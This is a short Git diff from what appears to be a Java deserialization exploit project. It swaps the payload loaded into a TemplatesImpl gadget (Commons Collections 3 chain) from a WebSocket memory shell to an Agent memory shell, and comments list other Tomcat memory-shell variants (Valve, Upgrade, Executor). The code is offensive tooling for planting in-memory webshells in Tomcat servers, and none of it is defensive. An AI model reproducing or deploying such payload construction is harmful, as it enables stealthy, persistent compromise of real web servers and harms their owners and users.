@@ -30,7 +30,8 @@ public class CC3TemplatesImpl {
 //        byte[] code1 = Files.readAllBytes(Paths.get("target/classes/org/example/tomcatmemshell/Valve/ValveMemShell2.class"));
 //        byte[] code1 = Files.readAllBytes(Paths.get("target/classes/org/example/tomcatmemshell/Upgrade/UpgradeMemShell.class"));
 //        byte[] code1 = Files.readAllBytes(Paths.get("target/classes/org/example/tomcatmemshell/Executor/ExecutorMemShell.class"));//Executor马复现失败，局限较大
-        byte[] code1 = Files.readAllBytes(Paths.get("target/classes/org/example/tomcatmemshell/WebSocket/WebSocketMemShell.class"));
+//        byte[] code1 = Files.readAllBytes(Paths.get("target/classes/org/example/tomcatmemshell/WebSocket/WebSocketMemShell.class"));
+        byte[] code1 = Files.readAllBytes(Paths.get("target/classes/org/example/tomcatmemshell/Agent/AgentMemShell.class"));
         TemplatesImpl templatesClass = new TemplatesImpl();
         Field[] fields = templatesClass.getClass().getDeclaredFields();
         for (Field field : fields) {
